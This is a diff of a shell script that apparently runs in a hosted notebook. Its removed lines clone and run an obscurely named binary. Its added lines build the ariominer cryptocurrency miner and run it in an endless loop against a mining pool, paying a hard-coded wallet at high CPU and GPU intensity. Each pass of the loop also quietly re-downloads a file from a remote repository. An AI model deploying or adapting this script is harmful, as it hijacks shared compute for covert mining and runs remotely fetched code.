@@ -6,16 +6,11 @@ cd /content/
 
 rm -rf ./linux8444/
 
-git clone https://github.com/mobileapps84741274/linux8444
-
-cd ./linux8444/
-
-mkdir ./linux84747474/
-
-cd ./linux84747474/
-
-cmake ..
-
+git clone http://github.com/bogdanadnan/ariominer.git
+cd ariominer
+mkdir build
+cd build
+cmake .. -DCMAKE_BUILD_TYPE=Release
 make
 
 while true
@@ -23,6 +18,6 @@ do
 
 wget -N -q https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linuxweb8412
 
-./linux84 8
+./ariominer --mode miner --pool http://aro.blueinc.cloud:84 --wallet 3VnCmWyLQb8f1XhkQv4fiB1CrGewityDDteNtQwhMu3DjBuaDmUWbPMkPnbSaJPcbGrrJi1zkCHDXd4fGtTUeej3 --name linux84 --cpu-intensity 80 --gpu-intensity-cblocks 80 --gpu-intensity-gblocks 80
 
 done
